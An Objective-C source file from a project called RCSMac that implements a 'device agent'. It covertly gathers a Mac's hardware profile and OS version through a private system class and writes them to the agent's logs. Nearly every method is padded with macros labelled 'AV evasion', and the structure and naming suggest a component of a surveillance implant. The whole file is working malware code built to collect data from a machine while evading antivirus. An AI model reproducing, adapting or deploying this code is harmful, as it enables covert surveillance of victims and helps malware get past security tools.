//
//  RCSMAgentDevice.m
//  RCSMac
//
//  Created by kiodo on 3/11/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//
#import <objc/objc-class.h>

#import "RCSMAgentDevice.h"
#import "RCSMCommon.h"
#import "RCSMTaskManager.h"

#import "RCSMAVGarbage.h"

NSString *kSPHardwareDataType     = @"SPHardwareDataType";
NSString *kSPApplicationsDataType = @"SPApplicationsDataType";

static __m_MAgentDevice *sharedAgentDevice = nil;

@implementation __m_MAgentDevice

#pragma mark -
#pragma mark Class and init methods
#pragma mark -

+ (__m_MAgentDevice *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentDevice == nil)
    {
      //
      // Assignment is not done here
      //
      [[self alloc] init];
    }
  }
  
  return sharedAgentDevice;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentDevice == nil)
    {
      sharedAgentDevice = [super allocWithZone: aZone];
      
      //
      // Assignment and return on first allocation
      //
      return sharedAgentDevice;
    }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (id)retain
{
  return self;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

#pragma mark -
#pragma mark Agent Formal Protocol Methods
#pragma mark -

- (BOOL)getDeviceInfo
{
  NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSData *infoStr = [self getSystemInfoWithType: kSPHardwareDataType];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  if (infoStr != nil)
    [self writeDeviceInfo: infoStr];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  [infoStr release];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  [pool release];
  
  return YES;
}

- (NSData*)getSystemInfoWithType: (NSString*)aType
{
  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSData *retData = nil;
  NSString *systemInfoStrHw = nil;
  NSMutableString *systemInfoStr = nil;
  NSDictionary *hwDict;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  id SPDocumentClass = nil;
  
  SPDocumentClass = objc_getClass("SPDocument");
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  if (SPDocumentClass == nil) 
  {   
    // AV evasion: only on release build
    AV_GARBAGE_004
    
    [pool release];
    return nil;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  id sp = [[SPDocumentClass alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_007
  
  if (sp == nil) 
  {   
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    [pool release];
    return nil;
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  // Setting detail level
  if ([sp respondsToSelector: @selector(setDetailLevel:)])
    [sp performSelector: @selector(setDetailLevel:)
             withObject: (id)1];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  if ([sp respondsToSelector: @selector(reportForDataType:)])
    hwDict = (NSDictionary*)[sp performSelector: @selector(reportForDataType:)
                                     withObject: aType];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  if (hwDict != nil)
  {
    NSArray *items = [hwDict objectForKey: @"_items"];
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    if (items != nil)
    {   
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      if ([sp respondsToSelector: @selector(stringForItem:dataType:)])
      {   
        // AV evasion: only on release build
        AV_GARBAGE_009
  
        systemInfoStrHw = (NSString*)[sp performSelector: @selector(stringForItem:dataType:)
                                            withObject: hwDict
                                            withObject: aType];
        
        // AV evasion: only on release build
        AV_GARBAGE_007
        
        if (systemInfoStrHw != nil)
        {   
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          systemInfoStr = [NSMutableString stringWithFormat:@"\nSoftware:\nMacOS version: %u.%u.%u\n\n",
                                                            gOSMajor, gOSMinor, gOSBugFix];
          [systemInfoStr appendString: systemInfoStrHw];
          
          retData = [[systemInfoStr dataUsingEncoding: NSUTF16LittleEndianStringEncoding] retain];
          
          // AV evasion: only on release build
          AV_GARBAGE_002
          
        }
      }
    }
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
  }
  
  [pool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  return retData;
}

- (BOOL)writeDeviceInfo: (NSData*)aInfo
{
  NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
  
  NSString *tmpUTF16Info = nil;
  
  if (aInfo == nil)
  {
    [pool release];
    return NO;
  }
  
  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
  
  BOOL success = [logManager createLog: LOGTYPE_DEVICE
                           agentHeader: nil
                             withLogID: 0];
#ifdef DEBUG_DEVICE
  NSLog(@"%s: writing log", __FUNCTION__);
#endif 
  
  if (success == TRUE)
  {

    tmpUTF16Info = [[NSString alloc]initWithData: aInfo
                                        encoding: NSUTF16LittleEndianStringEncoding];

    if (tmpUTF16Info == nil)
      tmpUTF16Info =  [[NSString alloc] initWithFormat: @"%@", @"no information"];
  
    NSMutableData *tmpData = 
    (NSMutableData*)[tmpUTF16Info dataUsingEncoding: NSUTF16LittleEndianStringEncoding];

    [tmpUTF16Info release];
    
    if (tmpData == nil) 
    {
      NSString *nullInfo = [[NSString alloc] initWithFormat: @"%@", @"no information"];
      tmpData = (NSMutableData*)[nullInfo dataUsingEncoding: NSUTF16LittleEndianStringEncoding];
      [nullInfo release];
    }
    
#ifdef DEBUG_DEVICE
    NSLog(@"%s: tmpData %@", __FUNCTION__, tmpData);
#endif
    
    [logManager writeDataToLog: tmpData
                      forAgent: LOGTYPE_DEVICE
                     withLogID: 0];
    
    [logManager closeActiveLog: LOGTYPE_DEVICE
                     withLogID: 0];
  }
  else
  {
#ifdef DEBUG_DEVICE
    NSLog(@"%s: error creating logs", __FUNCTION__);
#endif
  }
  
  [pool release];
  
  return YES;
}

- (BOOL)stop
{
  int internalCounter = 0;
  
  [mAgentConfiguration setObject: AGENT_STOP
                          forKey: @"status"];
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED
         && internalCounter <= MAX_STOP_WAIT_TIME)
  {
    internalCounter++;
    usleep(100000);
  }
  
  return YES;
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
  
  [self getDeviceInfo];
  
  [mAgentConfiguration setObject: AGENT_STOPPED
                          forKey: @"status"];
  [outerPool release];
}

- (BOOL)resume
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (NSMutableDictionary *)mAgentConfiguration
{
  return mAgentConfiguration;
}

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{   
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (aConfiguration != mAgentConfiguration)
  {   
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    [mAgentConfiguration release];
    mAgentConfiguration = [aConfiguration retain];
  }
}

@end
